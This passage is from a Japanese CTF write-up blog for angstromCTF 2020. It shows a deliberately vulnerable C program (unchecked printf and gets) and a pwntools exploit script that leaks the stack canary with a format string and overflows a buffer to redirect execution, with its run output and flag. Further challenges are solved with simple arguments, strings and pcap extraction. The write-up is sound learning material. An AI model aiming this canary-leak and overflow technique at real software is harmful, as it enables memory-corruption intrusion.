	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nice to meet you, &#34;</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="n">strcat</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">));</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Anything else you want to tell me? &#34;</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">info</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
	<span class="n">gets</span><span class="p">(</span><span class="n">info</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
	<span class="n">wake</span><span class="p">();</span>
	<span class="n">greet</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><br /></p>
<h3 id="solution-2">Solution</h3>
<p>FSB (Format String Bug)を使ってCanaryをLeakし、Canaryを壊さないようにしてBOFをするチャレンジです。</p>
<pre>
captureamerica@kali:~/CTF/angstromCTF_2020$ checksec canary
[*] '/home/captureamerica/CTF/angstromCTF_2020/canary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre>
<p><br />
オフセットのサイズ(56バイト)と、Canaryが現れる位置(17)は、gdbで調べました。</p>
<p>以下のスクリーンショットは、最初の入力でAAAA、2回目の入力でBBBBを入れた後に見たスタックです。</p>
<img src="https://captureamerica.github.io/writeups/img/angstromctf_canary_gdb.png" alt="angstromctf_canary_gdb.png">
<p>Return Address (0x4009c9)の2つ前がCanaryです。Null(\00)で始まってます。</p>
<p>バッファオーバーフローをさせるのは2回目の入力なので、BBBBの位置から見て56バイトがCanaryまでのオフセットです。</p>
<br>
FSBをした際に何番目になるかは、以下の方法で調べました。0x4009c9を目安に探します。実行する度に値は変わります。
<pre>
Hi! What's your name? %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Nice to meet you, 0x7fffffffb820 0x47 0xffffffffffffffb7 0x7ffff7fb5500 0x12 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2170252070252070 0x7fffffff000a (nil) 0xddff4ae3ed3ade00 0x7fffffffdf30 0x4009c9 0x7fffffffe010 0x3e900000000 0x4009d0 0x7ffff7e1abbb (nil)!
</pre>
<pre>
Hi! What's your name? %17$p
Nice to meet you, 0xe1cad64c2bec5d00!
</pre>
<br>
flag()関数のアドレス。
<pre>
gef➤  x flag
0x400787 <flag>:	0xe5894855
</pre>
<p><br />
以下が今回書いたコードです。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">user</span><span class="o">=</span><span class="s1">&#39;xxxxx&#39;</span>
    <span class="n">pw</span><span class="o">=</span><span class="s1">&#39;yyyyy&#39;</span>
    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;shell.actf.co&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">pw</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/2020/canary&#39;</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./canary&#39;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./canary&#39;</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Hi! What&#39;s your name? &#34;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%17$p&#34;</span><span class="p">)</span>
<span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">canary</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Nice to meet you, (.*)!\n&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
<span class="n">canary_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x400787</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Anything else you want to tell me? &#34;</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">7</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p><br />
実行結果：</p>
<pre>
captureamerica@kali:~/CTF/angstromCTF_2020$ ./canary_solve.py 
[+] Connecting to shell.actf.co on port 22: Done
[*] xxxxx@shell.actf.co:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[*] Working directory: '/problems/2020/canary'
[+] Starting remote process './canary' on shell.actf.co: pid 4605
0x8d7393450648a600
[+] Receiving all data: Done (32B)
[*] Stopped remote process 'canary' on shell.actf.co (pid 4605)
actf{youre_a_canary_killer_>:(}
</pre>
<br>
<p>Flag: <code>actf{youre_a_canary_killer_&gt;:(}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="reverse-taking-off-70-points">[Reverse]: Taking Off (70 points)</h2>
<hr>
<h3 id="challenge-3">Challenge</h3>
<blockquote>
<p>So you started revving up, but is it enough to take off? Find the problem in /problems/2020/taking_off/ in the shell server.</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>taking_off (ELF 64bit)</li>
</ul>
<p><br /></p>
<h3 id="solution-3">Solution</h3>
<p>簡単なやつだったんで、概要だけ。</p>
<p>Ghidraでソースを確認すると、引数が4つ必要で、最初の3つは整数、最後の1個は文字列なのがわかります。</p>
<p>整数は、計算して932になるもの、文字列は&quot;chicken&quot;です。</p>
<p>その後、パスワードが聞かれます。&ldquo;please give flag&quot;です。（XOR 0x2aされてます）。</p>
<pre>
xxxxx@actf:/problems/2020/taking_off$ ./taking_off 3 9 2 chicken
So you figured out how to provide input and command line arguments.
But can you figure out what input to provide?
Well, you found the arguments, but what's the password?
please give flag
Good job! You're ready to move on to bigger and badder rev!
actf{th3y_gr0w_up_s0_f4st}
</pre>
<p><br /></p>
<p>Flag: <code>actf{th3y_gr0w_up_s0_f4st}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="reverse-windows-of-opportunity-100-points">[Reverse]: Windows of Opportunity (100 points)</h2>
<hr>
<h3 id="challenge-4">Challenge</h3>
<blockquote>
<p>Clam&rsquo;s a windows elitist and he just can&rsquo;t stand seeing all of these linux challenges! So, he decided to step in and create his own rev challenge with the &ldquo;superior&rdquo; operating system.
<br><br>
Alternatively, find it at /problems/2020/windows_lives_matter/ on the shell server (even though you won&rsquo;t actually be able to run it from the shell server).</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>windows_of_opportunity.exe</li>
</ul>
<p><br /></p>
<h3 id="solution-4">Solution</h3>
<p>やけに正解者が多いなと思ったら、案の定stringsで解けるやつでした。</p>
<pre>
captureamerica@kali:~/Downloads$ strings windows_of_opportunity.exe | grep -i ctf
actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}
</pre>
<p><br />
100点問題だし、たぶん想定解じゃないんだろうな。一生懸命作ったのに、かわいそう。</p>
<p><br /></p>
<p>Flag: <code>actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}</code></p>
<p><br /><br />
<br /><br />
ここから下のやつは、解けなくて諦めたやつです。</p>
<h2 id="misc-psk-90-points">[Misc]: PSK (90 points)</h2>
<hr>
<h3 id="challenge-5">Challenge</h3>
<blockquote>
<p>My friend sent my yet another mysterious recording&hellip;
<br><br>
He told me he was inspired by PicoCTF 2019 and made his own transmissions. I&rsquo;ve looked at it, and it seems to be really compact and efficient.
<br><br>
Only 31 bps!!
<br><br>
See if you can decode what he sent to me. It&rsquo;s in actf{} format</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>transmission.wav</li>
</ul>
<p><br /></p>
<h3 id="unsolved">(Unsolved)</h3>
<p>はい、PicoCTF 2019でSSTVの問題ありましたね。今回のこれは、PSK31ってやつみたいです。</p>
<p>いくつかツールを試したんですが、いいのが見つからなくて、諦めました。</p>
<p><br /><br />
<br /><br /></p>
<h2 id="misc-inputter-100-points">[Misc]: Inputter (100 points)</h2>
<hr>
<h3 id="challenge-6">Challenge</h3>
<blockquote>
<p>Clam really likes challenging himself. When he learned about all these weird unprintable ASCII characters he just HAD to put it in a challenge. Can you satisfy his knack for strange and hard-to-input characters? Source.
<br><br>
Find it on the shell server at /problems/2020/inputter/.
<br><br>
Hint: There are ways to run programs without using the shell.</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>inputter (ELF 64bit)</li>
<li>inputter.c</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#define _GNU_SOURCE
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define FLAGSIZE 128
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">print_flag</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
    <span class="n">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot read flag file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">FLAGSIZE</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your argument count isn&#39;t right.&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; </span><span class="se">\n</span><span class="s">&#39;</span><span class="se">\&#34;\x07</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your argument isn&#39;t right.&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your input isn&#39;t right.&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You seem to know what you&#39;re doing.&#34;</span><span class="p">);</span>
    <span class="n">print_flag</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><br /></p>
<h3 id="unsolved-1">(Unsolved)</h3>
<p>ちょっとヒントの意味もわからなかったです。意外と難しいもんですね。後日、復習しておきます。</p>
<p><br /><br />
2020/03/20 - 復習しました。</p>
<p>なんか、pwntoolsで普通にできたみたいです。イベント中にやったときは、なぜかできなかった気がしたんですけど。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">user</span><span class="o">=</span><span class="s1">&#39;xxxxx&#39;</span>
    <span class="n">pw</span><span class="o">=</span><span class="s1">&#39;yyyyy&#39;</span>
    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;shell.actf.co&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">pw</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/2020/inputter&#39;</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s2">&#34;./inputter&#34;</span><span class="p">,</span><span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#39;</span><span class="se">\&#34;\x07</span><span class="s2">&#34;</span><span class="p">])</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;./inputter&#34;</span><span class="p">,</span><span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#39;</span><span class="se">\&#34;\x07</span><span class="s2">&#34;</span><span class="p">])</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><br>
<pre>
captureamerica@kali:~/CTF/angstromCTF_2020$ ./inputter_solve.py 
[+] Connecting to shell.actf.co on port 22: Done
[*] xxxxx@shell.actf.co:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[*] Working directory: '/problems/2020/inputter'
[+] Starting remote process './inputter' on shell.actf.co: pid 21500
[+] Receiving all data: Done (94B)
[*] Stopped remote process 'inputter' on shell.actf.co (pid 21500)
You seem to know what you're doing.
actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}
</pre>
<br>
<p>Flag: <code>actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="misc-all-these-rules--points">[Misc]: All These Rules (?? points)</h2>
<hr>
<h3 id="challenge-7">Challenge</h3>
<blockquote>
<p>Clam can&rsquo;t do this, he can&rsquo;t do that, wouldn&rsquo;t it be nice if there were something that he could do?
<br><br>
ssh <a href="mailto:chall@misc.2020.chall.actf.co">chall@misc.2020.chall.actf.co</a>
<br><br></p>
</blockquote>
<p><br /></p>
<h3 id="unsolved-2">(Unsolved)</h3>
<p>restricted shellの問題です。</p>
<p>どうやら、チャレンジが削除されてしまったようなので、何か不具合があったのかもです。</p>
<p>これは解きたかったなぁ。（というか、解けないやつだったかもだけど。）</p>
<p><br /><br />
<br /><br />
<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
<br />
ここから下はCTF終了後（2020/03/20）に行った復習です。他の方のWriteupとか参照してます。</p>
<p><br /><br />
<br /><br /></p>
<h2 id="misc-ws3-180-points">[Misc]: WS3 (180 points)</h2>
<hr>
<h3 id="challenge-8">Challenge</h3>
<blockquote>
<p>What the&hellip; record.pcapng</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>record.pcapng</li>
</ul>
<p><br /></p>
<h3 id="solution-5">Solution</h3>
<p>git-receive-pack というのが出てきて、よく知らなかったのでスルーしたやつなんですが、gitを使わずとも解ける問題だったみたいなので再度やってみました。</p>
<p>HTTP のオブジェクトをExportします。いくつかありますが、サイズが他と比べて特別大きい18KBのやつを狙います。</p>
<img src="https://captureamerica.github.io/writeups/img/angstromctf_ws3.png" alt="angstromctf_ws3.png">
<br>
binwalkします。
<pre>
captureamerica@kali:~/Downloads$ binwalk --dd='.*' git-receive-pack 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
183           0xB7            Zlib compressed data, default compression
342           0x156           Zlib compressed data, default compression
425           0x1A9           Zlib compressed data, default compression
</pre>
<br>
ここで、zlib-flateを使って解凍してもいいんですが、extractedの中にすでに解凍されたものも生成されてます。
<pre>
captureamerica@kali:~/Downloads/_git-receive-pack.extracted$ file *
156:                 data
156.zlib:            zlib compressed data
1A9:                 JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 413x549, components 3
1A9.zlib:            zlib compressed data
angstromctf_1A9.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 413x549, components 3
B7:                  Git tree 87872
B7.zlib:             zlib compressed data
</pre>
<br>
1A9はJpegファイルで、開くとフラグが見つかります。
<img src="https://captureamerica.github.io/writeups/img/angstromctf_1A9.jpg" alt="angstromctf_1A9.jpg">
<br>
<p>Flag: <code>actf{git_good_git_wireshark-123323}</code></p>
<p><br /><br />
<br /><br /></p>
<hr>
<p><br /><br />
<br /><br /></p>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">
        2020-03-20
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
          <a href="https://captureamerica.github.io/writeups/tags/reviewed/">Reviewed</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="https://captureamerica.github.io/writeups/post/riftctf_2020/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">RiftCTF 2020 Writeup</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="https://captureamerica.github.io/writeups/post/utctf_2020/">
            <span class="next-text nav-default">UTCTF 2020 Writeup</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2019 - 
    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  



<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-104910699-2', 'auto');
	ga('set', 'anonymizeIp', true);
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>







</body>
</html>
